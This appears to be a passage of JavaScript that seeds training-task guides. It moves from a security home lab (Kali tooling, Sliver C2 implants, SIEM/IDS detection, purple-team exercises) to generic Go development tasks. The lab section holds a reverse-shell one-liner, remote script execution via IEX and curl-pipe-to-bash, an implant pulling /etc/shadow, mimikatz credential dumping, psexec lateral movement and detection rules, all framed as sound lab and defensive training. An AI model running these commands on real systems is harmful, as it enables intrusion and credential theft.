# Resources: 4GB RAM, 2 cores, 60GB disk

# Network configuration:
# - NIC 1: VLAN 100 (security lab)
# - NIC 2: NAT/bridged for updates

# Update system
sudo apt update && sudo apt upgrade -y

# Enable SSH
sudo systemctl enable ssh --now
\`\`\`

### Essential Additional Tools
\`\`\`bash
# BloodHound (AD attack path mapping)
sudo apt install bloodhound neo4j
# Start neo4j, change default password
sudo neo4j start
# Access http://localhost:7474 (neo4j:neo4j)
bloodhound

# BloodHound Python collector
pip install bloodhound

# CrackMapExec (Swiss army knife for AD)
sudo apt install crackmapexec
# Or from GitHub for latest
pipx install crackmapexec

# Sliver C2 Framework
curl https://sliver.sh/install | sudo bash
# Start server
sliver-server

# Chisel (pivoting)
# Download from GitHub releases
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_linux_amd64.gz

# Ligolo-ng (better pivoting)
# Download from GitHub releases

# Kerbrute (AD user enumeration)
go install github.com/ropnop/kerbrute@latest

# LinPEAS/WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
\`\`\`

### Tool Organization
\`\`\`bash
# Create directory structure
mkdir -p ~/tools/{ad,web,privesc,c2,wordlists}

# Symlink scripts
ln -s /usr/share/webshells ~/tools/webshells

# Wordlists
ln -s /usr/share/wordlists ~/tools/wordlists
# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git ~/tools/wordlists/SecLists
\`\`\`

### Shell Configuration
\`\`\`bash
# ~/.zshrc additions
alias serve='python3 -m http.server 80'
alias listen='rlwrap nc -lvnp'

export LHOST=10.0.100.10
export RHOST=10.0.100.20

# Functions
rev() {
    echo "bash -i >& /dev/tcp/$LHOST/$1 0>&1"
}
\`\`\`

### Network Access Rules
\`\`\`
pfSense rules for attack machine:
- Allow: VLAN 100 (security) ↔ VLAN 100
- Allow: VLAN 100 → Internet (updates)
- Block: VLAN 100 → VLAN 10/20/30 (prod)

Verify isolation:
nmap 10.0.20.0/24  # Should timeout/be blocked
\`\`\`

## Completion Criteria
- [ ] Kali VM deployed and updated
- [ ] Additional tools installed
- [ ] Network access only to lab VLAN
- [ ] Tools organized and accessible`],

				['Configure C2 framework', 'Sliver or Mythic: generate implants, set up listeners (HTTP, HTTPS, DNS). Practice: deploy implant to vulnerable VM, execute commands, lateral movement. Understand C2 traffic.',
`## Command & Control Framework

### Sliver Setup
\`\`\`bash
# Install (already done on Kali)
sliver-server

# Generate config for operators
sliver > multiplayer
sliver > new-operator --name attacker --lhost 10.0.100.10

# Import config on client
sliver-client import operator.cfg
\`\`\`

### Generating Implants
\`\`\`bash
# HTTP implant
sliver > generate --http 10.0.100.10 --os windows --arch amd64 --save /tmp/http.exe

# HTTPS implant (needs certificate)
sliver > generate --https 10.0.100.10 --os windows --save /tmp/https.exe

# DNS implant (stealthier)
sliver > generate --dns 10.0.100.10 --os windows --save /tmp/dns.exe

# Linux implant
sliver > generate --http 10.0.100.10 --os linux --save /tmp/implant

# Shellcode (for injection)
sliver > generate --http 10.0.100.10 --format shellcode --save /tmp/shellcode.bin
\`\`\`

### Starting Listeners
\`\`\`bash
# HTTP listener
sliver > http --lport 80

# HTTPS listener (auto-generates cert)
sliver > https --lport 443

# DNS listener
sliver > dns --domains lab.local --lport 53

# List active listeners
sliver > jobs
\`\`\`

### Operating the Implant
\`\`\`bash
# Wait for callback, then interact
sliver > sessions
sliver > use [session-id]

# Basic commands
sliver (IMPLANT) > whoami
sliver (IMPLANT) > pwd
sliver (IMPLANT) > ls
sliver (IMPLANT) > cat /etc/passwd

# File operations
sliver (IMPLANT) > download /etc/shadow
sliver (IMPLANT) > upload /tmp/linpeas.sh /tmp/

# Execute commands
sliver (IMPLANT) > execute -o whoami
sliver (IMPLANT) > shell  # Interactive shell

# Process injection
sliver (IMPLANT) > ps
sliver (IMPLANT) > migrate [pid]
\`\`\`

### Pivoting with Sliver
\`\`\`bash
# Start SOCKS proxy through implant
sliver (IMPLANT) > socks5 start

# Use with proxychains
# /etc/proxychains.conf: socks5 127.0.0.1 1081
proxychains nmap -sT 10.0.20.0/24

# Port forwarding
sliver (IMPLANT) > portfwd add -l 8080 -r 10.0.20.10:80
\`\`\`

### Understanding C2 Traffic
\`\`\`
HTTP beacon:
- Regular HTTP POSTs to /api/endpoint
- Base64 or encrypted body
- Jitter: random delay between callbacks

DNS beacon:
- TXT record queries to attacker domain
- Encoded commands in responses
- Slower but stealthier

Detection:
- Unusual DNS queries
- Beaconing patterns (regular intervals)
- Encrypted traffic to unknown hosts
\`\`\`

## Completion Criteria
- [ ] C2 server running
- [ ] Implant deployed to vulnerable VM
- [ ] Execute commands remotely
- [ ] Set up pivoting through implant`],

				['Add detection tools', 'Elastic Security (SIEM): ingest Windows/Linux logs, detect attacks. Wazuh: HIDS, file integrity. Suricata: NIDS. Create detection rules, tune false positives.',
`## Detection Stack

### Elastic Security (SIEM)
\`\`\`yaml
# docker-compose.yml
services:
  elasticsearch:
    image: elasticsearch:8.8.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=true
      - ELASTIC_PASSWORD=changeme
    ports:
      - "9200:9200"

  kibana:
    image: kibana:8.8.0
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
      - ELASTICSEARCH_USERNAME=elastic
      - ELASTICSEARCH_PASSWORD=changeme
    ports:
      - "5601:5601"
\`\`\`

\`\`\`bash
# Enable Elastic Security
# Kibana → Security → Detections → Load prebuilt rules

# Install Elastic Agent on endpoints
# Fleet → Add agent → Download and install

# Key detection rules:
# - Credential Dumping (mimikatz)
# - Unusual Process Execution
# - Persistence Mechanisms
# - Lateral Movement
\`\`\`

### Wazuh (HIDS)
\`\`\`bash
# Single-node deployment
curl -sO https://packages.wazuh.com/4.5/wazuh-install.sh
sudo bash wazuh-install.sh -a

# Access dashboard: https://server:443
# Default: admin:admin (change immediately)

# Install agent on endpoints
curl -so wazuh-agent.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.5.0-1_amd64.deb
sudo WAZUH_MANAGER='10.0.20.30' dpkg -i wazuh-agent.deb
sudo systemctl enable wazuh-agent --now
\`\`\`

\`\`\`xml
<!-- /var/ossec/etc/ossec.conf - File integrity monitoring -->
<syscheck>
  <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
  <directories check_all="yes">/home</directories>
</syscheck>
\`\`\`

### Suricata (NIDS)
\`\`\`bash
# Install
sudo apt install suricata

# Configure interface
sudo nano /etc/suricata/suricata.yaml
# af-packet:
#   - interface: eth0

# Update rules
sudo suricata-update

# Run
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Logs: /var/log/suricata/eve.json
\`\`\`

\`\`\`yaml
# Custom rule example
# /etc/suricata/rules/local.rules
alert tcp any any -> any 4444 (msg:"Possible Reverse Shell"; sid:1000001; rev:1;)
alert dns any any -> any 53 (msg:"Sliver DNS C2"; dns.query; content:".lab.local"; sid:1000002; rev:1;)
\`\`\`

### Integration
\`\`\`bash
# Send Suricata logs to Elasticsearch
# /etc/suricata/suricata.yaml
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns

# Use Filebeat to ship to Elastic
# /etc/filebeat/filebeat.yml
filebeat.inputs:
  - type: log
    paths:
      - /var/log/suricata/eve.json
    json.keys_under_root: true

output.elasticsearch:
  hosts: ["10.0.20.30:9200"]
\`\`\`

## Completion Criteria
- [ ] SIEM ingesting logs
- [ ] HIDS agents deployed
- [ ] NIDS monitoring traffic
- [ ] Detection rules configured`],

				['Practice attack/defense', 'Purple team exercises: attack from Kali, detect in SIEM. Document: attack technique, logs generated, detection logic. Build playbooks. Atomic Red Team for tests.',
`## Purple Team Exercises

### Exercise Framework
\`\`\`markdown
# Exercise Template

## Objective
Test detection of [MITRE ATT&CK Technique]

## Attack Phase
- Tool: [tool name]
- Command: [exact command]
- Expected result: [what should happen]

## Detection Phase
- Log source: [Windows Security, Sysmon, etc.]
- Event ID: [specific event IDs]
- Search query: [Elastic/Splunk query]

## Results
- [ ] Attack successful
- [ ] Alert triggered
- [ ] Logs captured
- [ ] Time to detect: [X minutes]

## Improvements
- Additional detection needed for [gap]
- Tune rule to reduce false positives by [method]
\`\`\`

### Atomic Red Team
\`\`\`powershell
# Install on Windows
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# List available tests
Invoke-AtomicTest T1003 -ShowDetailsBrief

# Run specific test
Invoke-AtomicTest T1003.001  # LSASS Memory dump

# Cleanup after test
Invoke-AtomicTest T1003.001 -Cleanup
\`\`\`

### Example Exercise: Credential Dumping
\`\`\`markdown
## Attack: T1003.001 - LSASS Memory

### Attack Phase
\`\`\`powershell
# On compromised Windows VM
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
\`\`\`

### Expected Logs
- Windows Security 4656: Handle to LSASS
- Sysmon Event 10: Process accessed LSASS
- Sysmon Event 1: mimikatz.exe process created

### Detection Query (Elastic)
\`\`\`
event.code: "10" AND process.name: "lsass.exe"
\`\`\`

### Results
- Attack: ✓ Credentials extracted
- Detection: ✓ Sysmon alert fired
- Gap: No alert for in-memory mimikatz
\`\`\`

### Example Exercise: Lateral Movement
\`\`\`markdown
## Attack: T1021.002 - SMB/Admin Shares

### Attack Phase
\`\`\`bash
# From Kali
crackmapexec smb 10.0.20.15 -u admin -p 'Password123' -x "whoami"
psexec.py domain/admin:Password123@10.0.20.15
\`\`\`

### Expected Logs
- Windows Security 4624: Logon Type 3 (Network)
- Windows Security 4672: Special privileges assigned
- Windows Security 4648: Explicit credentials

### Detection Query
\`\`\`
event.code: "4624" AND winlog.event_data.LogonType: "3"
  AND NOT source.ip: ("10.0.20.10" OR "10.0.20.11")
\`\`\`

### Results
- Detected: Network logon from unusual source
- Gap: Need baseline of normal admin activity
\`\`\`

### Building Playbooks
\`\`\`markdown
# Playbook: Credential Theft Response

## Trigger
Alert: LSASS memory access or mimikatz detected

## Investigation Steps
1. Identify affected host and user context
2. Check for lateral movement (4624 Type 3 from that host)
3. Review process tree for initial access
4. Check for persistence mechanisms

## Containment
1. Isolate affected host from network
2. Force password reset for compromised accounts
3. Revoke active sessions

## Eradication
1. Image system for forensics
2. Rebuild or restore from known-good state
3. Review and patch initial access vector

## Recovery
1. Restore network access with monitoring
2. Monitor for re-compromise indicators
\`\`\`

## Completion Criteria
- [ ] Complete 5+ ATT&CK technique exercises
- [ ] Document detection gaps
- [ ] Create/tune detection rules
- [ ] Build response playbooks`],
			]},
		]);
	} else {
		// Generic development tasks
		addTasks(path.id, [
			{ name: 'Foundation', desc: 'Core implementation', tasks: [
				['Research the domain', 'Read documentation, RFCs, existing implementations. Understand: problem being solved, constraints, typical approaches. List requirements: functional and non-functional.',
`## Domain Research

### Information Sources
\`\`\`markdown
1. Official Documentation
   - Language/framework docs
   - API references
   - Best practices guides

2. Specifications & RFCs
   - IETF RFCs for protocols
   - W3C specs for web standards
   - Language specifications

3. Existing Implementations
   - GitHub: search for similar projects
   - Study architecture decisions
   - Learn from issues and PRs

4. Community Resources
   - Stack Overflow discussions
   - Blog posts from practitioners
   - Conference talks
\`\`\`

### Requirements Gathering
\`\`\`markdown
## Functional Requirements
- What must the system do?
- Input/output specifications
- User workflows
- Integration points

## Non-Functional Requirements
- Performance: latency, throughput
- Scalability: users, data volume
- Reliability: uptime, error handling
- Security: authentication, authorization
- Maintainability: code quality, documentation

## Constraints
- Technology stack
- Timeline
- Team expertise
- Budget/resources
\`\`\`

### Domain Model
\`\`\`markdown
## Core Concepts
- Entity: [name] - [description]
- Entity: [name] - [description]

## Relationships
- [Entity A] has many [Entity B]
- [Entity C] belongs to [Entity D]

## Key Operations
- Create/Read/Update/Delete [entity]
- [Business operation]: [description]
\`\`\`

## Completion Criteria
- [ ] Read relevant documentation/specs
- [ ] Study 2-3 existing implementations
- [ ] Document functional requirements
- [ ] Document non-functional requirements`],

				['Design architecture', 'Identify components and responsibilities. Define interfaces between components. Choose data structures and algorithms. Consider: scalability, maintainability, testability.',
`## Architecture Design

### Component Identification
\`\`\`markdown
## Components
1. **[Component Name]**
   - Responsibility: [single responsibility]
   - Dependencies: [what it needs]
   - Provides: [what it offers]

2. **[Component Name]**
   - Responsibility: ...
\`\`\`

### Interface Design
\`\`\`go
// Define clear interfaces between components
type Storage interface {
    Get(key string) ([]byte, error)
    Set(key string, value []byte) error
    Delete(key string) error
}

type Cache interface {
    Get(key string) (interface{}, bool)
    Set(key string, value interface{}, ttl time.Duration)
    Invalidate(key string)
}

// Components depend on interfaces, not implementations
type Service struct {
    storage Storage
    cache   Cache
}
\`\`\`

### Data Structures
\`\`\`markdown
## Key Data Structures
| Data | Structure | Rationale |
|------|-----------|-----------|
| Users | Hash Map | O(1) lookup by ID |
| Events | Append-only log | Time-ordered, immutable |
| Search | Inverted index | Fast full-text search |

## Algorithm Choices
| Operation | Algorithm | Complexity |
|-----------|-----------|------------|
| Sort | QuickSort | O(n log n) avg |
| Search | Binary search | O(log n) |
| Match | Regex/FSM | O(n) |
\`\`\`

### Architecture Diagram
\`\`\`
┌─────────────┐     ┌─────────────┐
│   Client    │────▶│  API Layer  │
└─────────────┘     └──────┬──────┘
                           │
                    ┌──────▼──────┐
                    │   Service   │
                    │    Layer    │
                    └──────┬──────┘
                           │
          ┌────────────────┼────────────────┐
          │                │                │
   ┌──────▼──────┐  ┌──────▼──────┐  ┌──────▼──────┐
   │   Cache     │  │  Database   │  │  External   │
   │  (Redis)    │  │ (Postgres)  │  │   Service   │
   └─────────────┘  └─────────────┘  └─────────────┘
\`\`\`

### Design Decisions
\`\`\`markdown
## Decision: [Topic]
**Context**: [Why this decision is needed]
**Options**:
1. [Option A] - Pros: ..., Cons: ...
2. [Option B] - Pros: ..., Cons: ...
**Decision**: [Chosen option]
**Rationale**: [Why this choice]
\`\`\`

## Completion Criteria
- [ ] Components identified with responsibilities
- [ ] Interfaces defined between components
- [ ] Data structures chosen and justified
- [ ] Architecture diagram created`],

				['Set up project structure', 'Initialize repo, package manager, build system. Organize: src/, tests/, docs/. Configure linting, formatting. CI pipeline for automated checks. README with setup instructions.',
`## Project Setup

### Directory Structure
\`\`\`bash
project/
├── src/                 # Source code
│   ├── main.go         # Entry point
│   ├── server/         # HTTP server
│   ├── storage/        # Data layer
│   └── utils/          # Shared utilities
├── tests/              # Test files
│   ├── unit/
│   └── integration/
├── docs/               # Documentation
│   ├── api.md
│   └── architecture.md
├── scripts/            # Build/deploy scripts
├── .github/
│   └── workflows/      # CI/CD
├── Makefile           # Build commands
├── README.md
├── go.mod             # Dependencies
└── .gitignore
\`\`\`

### Initialize Project
\`\`\`bash
# Git
git init
echo "node_modules/\\n.env\\n*.log\\ndist/" > .gitignore

# Go
go mod init github.com/user/project

# Node
npm init -y

# Python
python -m venv venv
pip install -r requirements.txt
\`\`\`

### Linting & Formatting
\`\`\`bash
# Go
go install golang.org/x/tools/cmd/goimports@latest
# Use: goimports -w .

# JavaScript/TypeScript
npm install -D eslint prettier
npx eslint --init
echo '{"semi": true, "singleQuote": true}' > .prettierrc

# Python
pip install black flake8 mypy
# pyproject.toml for configuration
\`\`\`

### CI Pipeline
\`\`\`yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Lint
        run: |
          go install golang.org/x/lint/golint@latest
          golint ./...

      - name: Test
        run: go test -v -race -coverprofile=coverage.out ./...

      - name: Build
        run: go build -v ./...
\`\`\`

### Makefile
\`\`\`makefile
.PHONY: build test lint clean

build:
	go build -o bin/app ./cmd/app

test:
	go test -v -race ./...

lint:
	golangci-lint run

clean:
	rm -rf bin/
\`\`\`

## Completion Criteria
- [ ] Repository initialized
- [ ] Directory structure created
- [ ] Linting and formatting configured
- [ ] CI pipeline running
- [ ] README with setup instructions`],

				['Implement core logic', 'Build minimum viable functionality first. Focus on correctness, then performance. Iterate: implement, test, refine. Keep functions small and focused.',
`## Core Implementation

### MVP Approach
\`\`\`markdown
## MVP Scope
1. [Core feature 1] - Essential
2. [Core feature 2] - Essential
3. [Nice-to-have]   - Defer

## Implementation Order
1. Data models / types
2. Storage layer
3. Business logic
4. API layer
5. Integration
\`\`\`

### Implementation Pattern
\`\`\`go
// 1. Define types first
type User struct {
    ID        string
    Email     string
    CreatedAt time.Time
}

// 2. Define interface
type UserRepository interface {
    Create(user *User) error
    GetByID(id string) (*User, error)
    GetByEmail(email string) (*User, error)
}

// 3. Implement with tests alongside
type PostgresUserRepo struct {
    db *sql.DB
}

func (r *PostgresUserRepo) Create(user *User) error {
    _, err := r.db.Exec(
        "INSERT INTO users (id, email, created_at) VALUES ($1, $2, $3)",
        user.ID, user.Email, user.CreatedAt,
    )
    return err
}

// 4. Write test immediately
func TestUserRepo_Create(t *testing.T) {
    repo := setupTestRepo(t)
    user := &User{ID: "1", Email: "test@example.com"}

    err := repo.Create(user)
    assert.NoError(t, err)

    retrieved, err := repo.GetByID("1")
    assert.NoError(t, err)
    assert.Equal(t, user.Email, retrieved.Email)
}
\`\`\`

### Function Design
\`\`\`go
// Keep functions small and focused
// Each function does ONE thing

// Bad: does too much
func ProcessOrder(order Order) error {
    // validate
    // calculate price
    // check inventory
    // charge payment
    // update database
    // send email
    // 200 lines...
}

// Good: composed of focused functions
func ProcessOrder(order Order) error {
    if err := validateOrder(order); err != nil {
        return fmt.Errorf("validation: %w", err)
    }

    total := calculateTotal(order)

    if err := checkInventory(order.Items); err != nil {
        return fmt.Errorf("inventory: %w", err)
    }

    if err := chargePayment(order.CustomerID, total); err != nil {
        return fmt.Errorf("payment: %w", err)
    }

    if err := saveOrder(order); err != nil {
        return fmt.Errorf("save: %w", err)
    }

    go sendConfirmationEmail(order)
    return nil
}
\`\`\`

### Iteration Cycle
\`\`\`markdown
1. Write failing test
2. Implement minimal code to pass
3. Refactor if needed
4. Repeat

Keep commits small and focused:
- "Add User struct and repository interface"
- "Implement PostgresUserRepo.Create"
- "Add GetByID and GetByEmail methods"
\`\`\`

## Completion Criteria
- [ ] Core data types defined
- [ ] Essential operations implemented
- [ ] Tests passing for core functionality
- [ ] Code is readable and maintainable`],

				['Add error handling', 'Define error types for different failure modes. Return errors, don\'t panic/throw unexpectedly. Log errors with context. Provide actionable error messages to users.',
`## Error Handling

### Error Types
\`\`\`go
// Define specific error types
var (
    ErrNotFound      = errors.New("resource not found")
    ErrUnauthorized  = errors.New("unauthorized")
    ErrInvalidInput  = errors.New("invalid input")
    ErrConflict      = errors.New("resource conflict")
)

// Rich error with context
type AppError struct {
    Code    string
    Message string
    Err     error
    Details map[string]interface{}
}

func (e *AppError) Error() string {
    if e.Err != nil {
        return fmt.Sprintf("%s: %v", e.Message, e.Err)
    }
    return e.Message
}

func (e *AppError) Unwrap() error {
    return e.Err
}

// Constructor
func NewAppError(code, message string, err error) *AppError {
    return &AppError{Code: code, Message: message, Err: err}
}
\`\`\`

### Error Wrapping
\`\`\`go
func GetUser(id string) (*User, error) {
    user, err := repo.GetByID(id)
    if err != nil {
        if errors.Is(err, sql.ErrNoRows) {
            return nil, fmt.Errorf("user %s: %w", id, ErrNotFound)
        }
        return nil, fmt.Errorf("get user %s: %w", id, err)
    }
    return user, nil
}

// Caller can check error type
user, err := GetUser(id)
if errors.Is(err, ErrNotFound) {
    // Handle not found
}
\`\`\`

### API Error Responses
\`\`\`go
type ErrorResponse struct {
    Error   string                 \`json:"error"\`
    Code    string                 \`json:"code"\`
    Details map[string]interface{} \`json:"details,omitempty"\`
}

func handleError(w http.ResponseWriter, err error) {
    var status int
    var response ErrorResponse

    switch {
    case errors.Is(err, ErrNotFound):
        status = http.StatusNotFound
        response = ErrorResponse{Error: "Not found", Code: "NOT_FOUND"}
    case errors.Is(err, ErrUnauthorized):
        status = http.StatusUnauthorized
        response = ErrorResponse{Error: "Unauthorized", Code: "UNAUTHORIZED"}
    case errors.Is(err, ErrInvalidInput):
        status = http.StatusBadRequest
        response = ErrorResponse{Error: err.Error(), Code: "INVALID_INPUT"}
    default:
        // Log internal error, return generic message
        log.Printf("internal error: %v", err)
        status = http.StatusInternalServerError
        response = ErrorResponse{Error: "Internal error", Code: "INTERNAL"}
    }

    w.WriteHeader(status)
    json.NewEncoder(w).Encode(response)
}
\`\`\`

### Logging Errors
\`\`\`go
// Log with context
logger.Error("failed to process order",
    "error", err,
    "order_id", order.ID,
    "customer_id", order.CustomerID,
    "amount", order.Total,
)

// Include stack trace for debugging
if debug {
    logger.Error("error with stack", "error", fmt.Sprintf("%+v", err))
}
\`\`\`

### Don't Panic
\`\`\`go
// Bad: panic on error
func MustGetConfig() Config {
    c, err := LoadConfig()
    if err != nil {
        panic(err)  // Don't do this in library code
    }
    return c
}

// Good: return error
func GetConfig() (Config, error) {
    return LoadConfig()
}

// Panic only for programmer errors (bugs)
// that should never happen in correct code
\`\`\`

## Completion Criteria
- [ ] Error types defined for failure modes
- [ ] Errors wrapped with context
- [ ] API returns appropriate status codes
- [ ] Errors logged with context`],
			]},
			{ name: 'Features', desc: 'Build out functionality', tasks: [
				['Implement main features', 'Prioritize by user value. Build incrementally: basic version, then enhance. Each feature: design, implement, test, document. Keep scope manageable.',
`## Feature Implementation

### Feature Prioritization
\`\`\`markdown
## Priority Matrix
| Feature | User Value | Effort | Priority |
|---------|------------|--------|----------|
| User auth | High | Medium | P0 |
| Search | High | High | P1 |
| Export | Medium | Low | P1 |
| Dark mode | Low | Low | P2 |

P0 = Must have for launch
P1 = Important, soon after launch
P2 = Nice to have
\`\`\`

### Feature Design Template
\`\`\`markdown
## Feature: [Name]

### User Story
As a [user type], I want [capability] so that [benefit].

### Acceptance Criteria
- [ ] User can [action 1]
- [ ] System [behavior 1]
- [ ] [Edge case] is handled

### Technical Design
- Components affected: [list]
- New endpoints: [list]
- Database changes: [list]

### Test Cases
1. Happy path: [description]
2. Error case: [description]
3. Edge case: [description]
\`\`\`

### Incremental Implementation
\`\`\`go
// Version 1: Basic functionality
func Search(query string) ([]Result, error) {
    // Simple substring match
    return db.Query("SELECT * FROM items WHERE name LIKE ?", "%"+query+"%")
}

// Version 2: Add pagination
func Search(query string, page, limit int) (*SearchResult, error) {
    offset := (page - 1) * limit
    results, err := db.Query(
        "SELECT * FROM items WHERE name LIKE ? LIMIT ? OFFSET ?",
        "%"+query+"%", limit, offset,
    )
    total := db.Count("SELECT COUNT(*) FROM items WHERE name LIKE ?", "%"+query+"%")
    return &SearchResult{Items: results, Total: total, Page: page}, err
}

// Version 3: Add filters
func Search(opts SearchOptions) (*SearchResult, error) {
    query := buildQuery(opts)  // Dynamic query builder
    return executeSearch(query)
}
\`\`\`

### Feature Flags (Optional)
\`\`\`go
// Control feature rollout
type FeatureFlags struct {
    EnableNewSearch bool \`json:"enable_new_search"\`
    EnableExport    bool \`json:"enable_export"\`
}

func Search(query string) ([]Result, error) {
    if flags.EnableNewSearch {
        return newSearchImplementation(query)
    }
    return legacySearch(query)
}
\`\`\`

### Documentation
\`\`\`markdown
## Search Feature

### Usage
\`\`\`bash
curl "https://api.example.com/search?q=keyword&page=1&limit=20"
\`\`\`

### Parameters
| Param | Type | Default | Description |
|-------|------|---------|-------------|
| q | string | required | Search query |
| page | int | 1 | Page number |
| limit | int | 20 | Results per page |

### Response
\`\`\`json
{
  "items": [...],
  "total": 100,
  "page": 1
}
\`\`\`
\`\`\`

## Completion Criteria
- [ ] Features prioritized
- [ ] Basic version implemented
- [ ] Tests cover main scenarios
- [ ] Feature documented`],

				['Add configuration', 'Config file (YAML, TOML, JSON) and/or environment variables. Sensible defaults. Validate config on load. Document all options. Support config reload if applicable.',
`## Configuration System

### Config Structure
\`\`\`go
type Config struct {
    Server   ServerConfig   \`yaml:"server"\`
    Database DatabaseConfig \`yaml:"database"\`
    Cache    CacheConfig    \`yaml:"cache"\`
    Log      LogConfig      \`yaml:"log"\`
}

type ServerConfig struct {
    Host         string        \`yaml:"host" env:"SERVER_HOST" default:"0.0.0.0"\`
    Port         int           \`yaml:"port" env:"SERVER_PORT" default:"8080"\`
    ReadTimeout  time.Duration \`yaml:"read_timeout" default:"30s"\`
    WriteTimeout time.Duration \`yaml:"write_timeout" default:"30s"\`
}

type DatabaseConfig struct {
    Host     string \`yaml:"host" env:"DB_HOST" required:"true"\`
    Port     int    \`yaml:"port" env:"DB_PORT" default:"5432"\`
    Name     string \`yaml:"name" env:"DB_NAME" required:"true"\`
    User     string \`yaml:"user" env:"DB_USER" required:"true"\`
    Password string \`yaml:"password" env:"DB_PASSWORD" required:"true"\`
    MaxConns int    \`yaml:"max_conns" default:"10"\`
}
\`\`\`

### Config File (config.yaml)
\`\`\`yaml
server:
  host: 0.0.0.0
  port: 8080
  read_timeout: 30s
  write_timeout: 30s

database:
  host: localhost
  port: 5432
  name: myapp
  user: postgres
  # password from env: DB_PASSWORD
  max_conns: 20

cache:
  enabled: true
  ttl: 5m

log:
  level: info
  format: json
\`\`\`

### Loading Configuration
\`\`\`go
func LoadConfig(path string) (*Config, error) {
    cfg := &Config{}

    // 1. Set defaults
    setDefaults(cfg)

    // 2. Load from file
    if path != "" {
        data, err := os.ReadFile(path)
        if err != nil {
            return nil, fmt.Errorf("read config: %w", err)
        }
        if err := yaml.Unmarshal(data, cfg); err != nil {
            return nil, fmt.Errorf("parse config: %w", err)
        }
    }

    // 3. Override with environment variables
    loadEnvOverrides(cfg)

    // 4. Validate
    if err := validateConfig(cfg); err != nil {
        return nil, fmt.Errorf("validate config: %w", err)
    }

    return cfg, nil
}

func validateConfig(cfg *Config) error {
    if cfg.Database.Host == "" {
        return errors.New("database.host is required")
    }
    if cfg.Server.Port < 1 || cfg.Server.Port > 65535 {
        return errors.New("server.port must be 1-65535")
    }
    return nil
}
\`\`\`

### Environment Variables
\`\`\`bash
# .env (development)
DB_HOST=localhost
DB_NAME=myapp_dev
DB_USER=dev
DB_PASSWORD=devpassword

# Production: set via deployment system
# Never commit .env with real credentials
\`\`\`

### Documentation
\`\`\`markdown
## Configuration

### File
Default: \`config.yaml\` in working directory
Override: \`--config /path/to/config.yaml\`

### Environment Variables
All config options can be overridden via environment:
| Option | Env Variable | Default |
|--------|--------------|---------|
| server.port | SERVER_PORT | 8080 |
| database.host | DB_HOST | required |
| log.level | LOG_LEVEL | info |

### Required Options
- database.host
- database.name
- database.user
- database.password
\`\`\`

## Completion Criteria
- [ ] Config file format defined
- [ ] Environment variable overrides work
- [ ] Validation on load
- [ ] All options documented`],

				['Build CLI or API', 'CLI: use argparse/clap/cobra for argument parsing. API: REST or gRPC, versioned endpoints. Consistent interface design. Help text and examples.',
`## Interface Design

### CLI with Cobra (Go)
\`\`\`go
var rootCmd = &cobra.Command{
    Use:   "myapp",
    Short: "MyApp does amazing things",
    Long:  \`MyApp is a tool for...\`,
}

var serverCmd = &cobra.Command{
    Use:   "server",
    Short: "Start the server",
    RunE: func(cmd *cobra.Command, args []string) error {
        port, _ := cmd.Flags().GetInt("port")
        return startServer(port)
    },
}

func init() {
    serverCmd.Flags().IntP("port", "p", 8080, "Port to listen on")
    serverCmd.Flags().StringP("config", "c", "", "Config file path")

    rootCmd.AddCommand(serverCmd)
    rootCmd.AddCommand(migrateCmd)
    rootCmd.AddCommand(versionCmd)
}

func main() {
    if err := rootCmd.Execute(); err != nil {
        os.Exit(1)
    }
}
\`\`\`

### REST API Design
\`\`\`go
// Router setup
func SetupRoutes(r *mux.Router) {
    // API versioning
    v1 := r.PathPrefix("/api/v1").Subrouter()

    // Resources
    v1.HandleFunc("/users", listUsers).Methods("GET")
    v1.HandleFunc("/users", createUser).Methods("POST")
    v1.HandleFunc("/users/{id}", getUser).Methods("GET")
    v1.HandleFunc("/users/{id}", updateUser).Methods("PUT")
    v1.HandleFunc("/users/{id}", deleteUser).Methods("DELETE")

    // Nested resources
    v1.HandleFunc("/users/{id}/orders", listUserOrders).Methods("GET")
}

// Consistent response format
type Response struct {
    Data  interface{} \`json:"data,omitempty"\`
    Error *APIError   \`json:"error,omitempty"\`
    Meta  *Meta       \`json:"meta,omitempty"\`
}

type Meta struct {
    Total   int \`json:"total,omitempty"\`
    Page    int \`json:"page,omitempty"\`
    PerPage int \`json:"per_page,omitempty"\`
}

func respondJSON(w http.ResponseWriter, status int, data interface{}) {
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(status)
    json.NewEncoder(w).Encode(Response{Data: data})
}
\`\`\`

### API Documentation (OpenAPI)
\`\`\`yaml
openapi: 3.0.0
info:
  title: MyApp API
  version: 1.0.0

paths:
  /api/v1/users:
    get:
      summary: List users
      parameters:
        - name: page
          in: query
          schema:
            type: integer
            default: 1
      responses:
        '200':
          description: Success
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/UserList'

    post:
      summary: Create user
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/CreateUser'
      responses:
        '201':
          description: Created
\`\`\`

### CLI Help Text
\`\`\`
$ myapp --help
MyApp does amazing things

Usage:
  myapp [command]

Available Commands:
  server      Start the server
  migrate     Run database migrations
  version     Print version

Flags:
  -h, --help      help for myapp
  -v, --verbose   verbose output

$ myapp server --help
Start the server

Usage:
  myapp server [flags]

Flags:
  -c, --config string   Config file path
  -p, --port int        Port to listen on (default 8080)
\`\`\`

## Completion Criteria
- [ ] CLI commands defined with help text
- [ ] API endpoints follow REST conventions
- [ ] Consistent request/response format
- [ ] API documentation generated`],

